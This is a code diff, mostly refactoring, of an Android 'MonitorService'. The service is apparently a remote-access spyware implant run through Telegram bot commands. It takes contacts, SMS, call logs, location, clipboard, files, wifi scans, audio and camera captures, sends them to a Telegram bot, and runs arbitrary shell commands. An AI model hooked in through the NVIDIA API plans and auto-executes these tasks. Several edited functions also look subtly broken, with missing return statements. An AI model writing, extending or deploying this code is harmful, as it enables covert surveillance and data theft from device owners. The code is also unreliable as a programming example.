@@ -29,12 +29,10 @@ import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import okhttp3.MediaType
-import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody
-import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import java.io.File
 import java.util.Map
@@ -231,54 +229,33 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", mutableMapOf())
+            sendTelegramTask(chatId, "contacts", mapOf())
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", mutableMapOf())
+            sendTelegramTask(chatId, "sms", mapOf())
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", mutableMapOf())
+            sendTelegramTask(chatId, "call_logs", mapOf())
         } else if (trimmed == "/apps") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "list"
-            sendTelegramTask(chatId, "apps", m)
+            sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
         } else if (trimmed == "/location") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "get"
-            sendTelegramTask(chatId, "location", m)
+            sendTelegramTask(chatId, "location", mapOf("action" to "get"))
         } else if (trimmed == "/files") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "list"
-            m["path"] = "/sdcard"
-            sendTelegramTask(chatId, "files", m)
+            sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
         } else if (trimmed == "/wifi") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "scan"
-            sendTelegramTask(chatId, "wifi", m)
+            sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
         } else if (trimmed == "/clipboard") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "get"
-            sendTelegramTask(chatId, "clipboard", m)
+            sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
         } else if (trimmed == "/screenshot") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "capture"
-            sendTelegramTask(chatId, "screen", m)
+            sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
         } else if (trimmed == "/audio") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "start"
-            m["duration"] = 10
-            sendTelegramTask(chatId, "audio", m)
+            sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 10))
         } else if (trimmed == "/camera") {
-            val m = mutableMapOf<String, Any>()
-            m["action"] = "capture"
-            m["camera"] = 0
-            sendTelegramTask(chatId, "camera", m)
+            sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
         } else if (trimmed.startsWith("/ai ")) {
             handleAiCommand(chatId, trimmed.substring(4).trim())
         } else if (trimmed.startsWith("/auto ")) {
             handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
         } else if (trimmed.startsWith("/shell ")) {
-            val m = mutableMapOf<String, Any>()
-            m["command"] = trimmed.substring(7).trim()
-            sendTelegramTask(chatId, "shell", m)
+            sendTelegramTask(chatId, "shell", mapOf("command" to trimmed.substring(7).trim()))
         } else {
             sendTelegramMessage(chatId, "Unknown. Use /help")
         }
@@ -356,7 +333,7 @@ class MonitorService : Service() {
             "audio" -> recordAudio(args as Map<String, Any>)
             "camera" -> captureCamera(args as Map<String, Any>)
             "shell" -> runShell(args["command"] as? String ?: "")
-            else -> mutableMapOf<String, Any>("error" to "Unknown capability: $capability")
+            else -> mapOf("error" to "Unknown capability: $capability")
         }
     }
 
@@ -394,7 +371,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Contacts", "Error", e) }
-        return mutableMapOf<String, Any>("contacts" to list, "count" to list.size)
+        return mapOf("contacts" to list, "count" to list.size)
     }
 
     private fun getSms(): Map<String, Any> {
@@ -417,7 +394,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Sms", "Error", e) }
-        return mutableMapOf<String, Any>("sms" to list, "count" to list.size)
+        return mapOf("sms" to list, "count" to list.size)
     }
 
     private fun getCallLogs(): Map<String, Any> {
@@ -441,7 +418,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Calls", "Error", e) }
-        return mutableMapOf<String, Any>("calls" to list, "count" to list.size)
+        return mapOf("calls" to list, "count" to list.size)
     }
 
     private fun getApps(): Map<String, Any> {
@@ -458,7 +435,7 @@ class MonitorService : Service() {
                 list.add(m)
             }
         } catch (e: Exception) { Log.e("Apps", "Error", e) }
-        return mutableMapOf<String, Any>("apps" to list, "count" to list.size)
+        return mapOf("apps" to list, "count" to list.size)
     }
 
     private fun getFiles(args: Map<String, Any>): Map<String, Any> {
@@ -467,7 +444,7 @@ class MonitorService : Service() {
         return when (action) {
             "list" -> {
                 val dir = File(path)
-                if (!dir.exists() || !dir.isDirectory) mutableMapOf<String, Any>("error" to "Not a directory")
+                if (!dir.exists() || !dir.isDirectory) mapOf("error" to "Not a directory")
                 else {
                     val files = dir.listFiles()?.mapNotNull { f ->
                         try {
@@ -480,10 +457,10 @@ class MonitorService : Service() {
                             m
                         } catch (e: Exception) { null }
                     } ?: emptyList()
-                    mutableMapOf<String, Any>("files" to files.take(200), "path" to path, "count" to files.size)
+                    mapOf("files" to files.take(200), "path" to path, "count" to files.size)
                 }
             }
-            else -> mutableMapOf<String, Any>("error" to "Unknown action")
+            else -> mapOf("error" to "Unknown action")
         }
     }
 
@@ -491,18 +468,18 @@ class MonitorService : Service() {
         val wm = getSystemService(android.net.wifi.WifiManager::class.java)
         val results = wm.scanResults ?: emptyList()
         val networks = results.map { r ->
-            mutableMapOf<String, Any>("ssid" to r.SSID, "bssid" to r.BSSID, "level" to r.level, "freq" to r.frequency, "caps" to r.capabilities)
+            mapOf("ssid" to r.SSID, "bssid" to r.BSSID, "level" to r.level, "freq" to r.frequency, "caps" to r.capabilities)
         }
-        mutableMapOf<String, Any>("networks" to networks, "count" to networks.size)
+        mapOf("networks" to networks, "count" to networks.size)
     }
 
     private fun getClipboard(): Map<String, Any> {
         val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
         if (cm.hasPrimaryClip()) {
             val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-            return mutableMapOf<String, Any>("text" to clip, "has_content" to clip.isNotEmpty())
+            return mapOf("text" to clip, "has_content" to clip.isNotEmpty())
         }
-        mutableMapOf<String, Any>("text" to "", "has_content" to false)
+        mapOf("text" to "", "has_content" to false)
     }
 
     private fun getLocation(): Map<String, Any> {
@@ -513,7 +490,7 @@ class MonitorService : Service() {
 
             val lastLoc = locationManager?.getLastKnownLocation(provider)
             if (lastLoc != null) {
-                return mutableMapOf<String, Any>(
+                return mapOf(
                     "lat" to lastLoc.latitude,
                     "lon" to lastLoc.longitude,
                     "acc" to lastLoc.accuracy,
@@ -544,14 +521,14 @@ class MonitorService : Service() {
             try {
                 locationManager?.requestSingleUpdate(provider, listener, null)
                 if (latch.await(5, TimeUnit.SECONDS)) {
-                    return result ?: mutableMapOf<String, Any>("error" to "Location request timed out")
+                    return result ?: mapOf("error" to "Location request timed out")
                 }
-                return mutableMapOf<String, Any>("error" to "Location timeout - no fix in 5s")
+                return mapOf("error" to "Location timeout - no fix in 5s")
             } catch (e: Exception) {
-                return mutableMapOf<String, Any>("error" to e.message ?: "Location error")
+                return mapOf("error" to e.message ?: "Location error")
             }
         } catch (e: Exception) {
-            return mutableMapOf<String, Any>("error" to e.message ?: "Location error")
+            return mapOf("error" to e.message ?: "Location error")
         }
     }
 
@@ -574,16 +551,16 @@ class MonitorService : Service() {
                         Thread.sleep((duration * 1000L).toLong())
                         stopRecording()
                     }
-                    mutableMapOf<String, Any>("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
+                    mapOf("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
                 } catch (e: Exception) {
-                    mutableMapOf<String, Any>("error" to e.message ?: "Audio start failed")
+                    mapOf("error" to e.message ?: "Audio start failed")
                 }
             }
             "stop" -> {
                 stopRecording()
-                mutableMapOf<String, Any>("status" to "stopped")
+                mapOf("status" to "stopped")
             }
-            else -> mutableMapOf<String, Any>("error" to "Unknown audio action")
+            else -> mapOf("error" to "Unknown audio action")
         }
     }
 
@@ -597,22 +574,22 @@ class MonitorService : Service() {
     private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
         val cameraId = (args["camera"] as? Int) ?: 0
         val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
-        mutableMapOf<String, Any>("status" to "requires_camera2", "note" to "Camera2 API needed", "file" to outputFile.absolutePath, "camera_id" to cameraId)
+        mapOf("status" to "requires_camera2", "note" to "Camera2 API needed", "file" to outputFile.absolutePath, "camera_id" to cameraId)
     }
 
     private fun getScreenshot(): Map<String, Any> {
-        mutableMapOf<String, Any>("status" to "requires_mediaprojection", "note" to "Requires MediaProjection permission")
+        mapOf("status" to "requires_mediaprojection", "note" to "Requires MediaProjection permission")
     }
 
     private fun runShell(cmd: String): Map<String, Any> {
-        if (cmd.isBlank()) return mutableMapOf<String, Any>("error" to "No command")
+        if (cmd.isBlank()) return mapOf("error" to "No command")
         try {
             val process = Runtime.getRuntime().exec(cmd)
             val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
             val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
             val exitCode = process.waitFor()
-            mutableMapOf<String, Any>("exit" to exitCode, "output" to output, "error" to error)
-        } catch (e: Exception) { mutableMapOf<String, Any>("error" to e.message ?: "unknown error") }
+            mapOf("exit" to exitCode, "output" to output, "error" to error)
+        } catch (e: Exception) { mapOf("error" to e.message ?: "unknown error") }
     }
 
     private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
@@ -671,13 +648,14 @@ class MonitorService : Service() {
     private fun sendTelegramInternal(chatId: Long, text: String) {
         try {
             val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
-            val params = mutableMapOf<String, Any>()
-            params["chat_id"] = chatId
-            params["text"] = if (text.length > 4000) text.take(4000) + "\n...[truncated]" else text
-            params["parse_mode"] = "Markdown"
+            val params = mapOf(
+                "chat_id" to chatId,
+                "text" to if (text.length > 4000) text.take(4000) + "\n...[truncated]" else text,
+                "parse_mode" to "Markdown"
+            )
             val jsonBody = gson.toJson(params)
-            val mediaType = "application/json".toMediaType()
-            val body = jsonBody.toRequestBody(mediaType)
+            val mediaType = MediaType.parse("application/json")
+            val body = RequestBody.create(jsonBody, mediaType)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
@@ -694,7 +672,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        file.readBytes().toRequestBody("text/plain".toMediaType()))
+                        RequestBody.create(file.readBytes(), MediaType.parse("text/plain")))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -735,7 +713,7 @@ class MonitorService : Service() {
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
-            val isGreeting = lower == "hi" || lower == "hello" || lower == "hey" || lower == "test" || lower == "ping"
+            val isGreeting: Boolean = if (lower == "hi") true else if (lower == "hello") true else if (lower == "hey") true else if (lower == "test") true else if (lower == "ping") true else false
             if (isGreeting) {
                 return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
             }
@@ -763,8 +741,8 @@ Only respond with valid JSON, no extra text."""
             payload["stream"] = false
 
             val jsonBody = gson.toJson(payload)
-            val mediaType = "application/json".toMediaType()
-            val body = jsonBody.toRequestBody(mediaType)
+            val mediaType = MediaType.parse("application/json")
+            val body = RequestBody.create(jsonBody, mediaType)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
                 .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
@@ -842,7 +820,7 @@ Only respond with valid JSON, no extra text."""
             }
         } catch (e: Exception) {
             Log.e("AI", "Parse error", e)
-            results.add(mutableMapOf<String, Any>("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
+            results.add(mapOf("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
         }
         return results
     }
